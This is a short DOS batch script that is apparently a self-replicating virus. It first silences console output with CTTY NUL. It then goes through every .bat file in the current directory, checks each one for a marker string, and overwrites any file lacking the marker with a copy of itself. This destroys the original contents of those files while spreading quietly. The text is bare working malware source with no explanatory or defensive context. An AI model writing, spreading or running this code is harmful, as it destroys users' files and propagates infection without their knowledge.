@CTTY NUL
If %1~==^~ goto c
For %%v in (*.bat) do call %0 ^ %%v
goto e
:c
find "^~" %2
if not errorlevel 1 goto e
type %0>%2
:e